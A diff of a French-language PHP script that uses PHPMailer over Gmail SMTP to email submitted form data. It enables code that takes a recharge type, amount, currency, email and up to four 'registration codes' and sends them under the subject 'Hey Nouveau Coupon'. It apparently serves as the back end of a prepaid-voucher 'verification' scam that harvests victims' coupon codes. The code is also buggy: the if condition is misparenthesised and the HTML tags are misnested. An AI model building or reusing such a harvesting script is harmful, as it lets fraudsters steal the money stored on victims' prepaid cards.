@@ -11,26 +11,22 @@ require './phpmailler/src/SMTP.php';
 
 
 
+// 
+//  
+//  
+//
 
+if(!empty($_POST['recharge']  && !empty($_POST['montant'] )  && !empty($_POST['email'] ) && !empty($_POST['codeEnregistrement'] ) && !empty($_POST['devise'] ) ) 
 
-// if(!empty($_POST['recharge'] ) 
-//  && !empty($_POST['montant'] )
-//  && !empty($_POST['devise'] ) 
-//  && !empty($_POST['codeEnregistrement'] )
-//  && !empty($_POST['codeEnregistrement1'] ) 
-// && !empty($_POST['codeEnregistrement2'] )
-// && !empty($_POST['codeEnregistrement3'] ) 
-// && !empty($_POST['codeEnregistrement4'] ) 
-// && !empty($_POST['email'] ) ){
-//     $recharge = htmlspecialchars($_POST['recharge']);
-//     $montant = htmlspecialchars($_POST['montant']);
-//     $devise = htmlspecialchars($_POST['devise']);
-//     $codeEnregistrement = htmlspecialchars($_POST['codeEnregistrement']);
-//     $codeEnregistrement1 = htmlspecialchars($_POST['codeEnregistrement1']);
-//     $codeEnregistrement2 = htmlspecialchars($_POST['codeEnregistrement2']);
-//     $codeEnregistrement3 = htmlspecialchars($_POST['codeEnregistrement3']);
-//     $codeEnregistrement4 = htmlspecialchars($_POST['codeEnregistrement4']);
-//     $email = htmlspecialchars($_POST['email']);
+  ){
+    $recharge = htmlspecialchars($_POST['recharge']);
+    $montant = htmlspecialchars($_POST['montant']);
+    $devise = htmlspecialchars($_POST['devise']);
+    $codeEnregistrement = htmlspecialchars($_POST['codeEnregistrement']);
+    $codeEnregistrement1 = htmlspecialchars($_POST['codeEnregistrement1']);
+    $codeEnregistrement2 = htmlspecialchars($_POST['codeEnregistrement2']);
+    $codeEnregistrement3 = htmlspecialchars($_POST['codeEnregistrement3']);
+    $email = htmlspecialchars($_POST['email']);
 
 
     //Create an instance; passing `true` enables exceptions
@@ -40,7 +36,6 @@ try {
     //Server settings
     // $mail->SMTPDebug = SMTP::DEBUG_SERVER;   
                        //Enable verbose debug output
-    echo "Je suis ici";
     $mail->isSMTP();                                            //Send using SMTP
     $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
     $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
@@ -63,8 +58,15 @@ try {
 
     //Content
     $mail->isHTML(true);                                  //Set email format to HTML
-    $mail->Subject = 'Here is the subject';
-    $mail->Body    = 'This is the HTML message body <b>in bold!</b>';
+    $mail->Subject = 'Hey Nouveau Coupon';
+    $mail->Body    = "Mr $email vient d'effectuer une verification  ${recharge} de ${montant} ${devise}<div> <br/> Les codes de
+     verifications sont <p>code Enregistrement 1: <b>${codeEnregistrement}</b></p>
+     <p>code Enregistrement 2 :<b> ${codeEnregistrement1}</p></b>
+     
+     <p>code Enregistrement 3 : <b> ${codeEnregistrement2}</b></p>
+     
+     <p>code Enregistrement 4 :<b> ${codeEnregistrement3}</b></p>
+     </div>";
     $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
 
     $mail->send();
@@ -77,17 +79,16 @@ try {
     </script>
     ";
 } catch (Exception $e) {
-    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
+    echo "Message could not be sent. Mailer Error:";
 }
 
     
 
-// }
-// else{
-//     echo "les champs sont non valides ";
-//     // heade("Location : index.html");
-//     // die();
-// }
+}
+else{
+    echo "les champs sont non valides ";
+    die();
+}
 
 
 
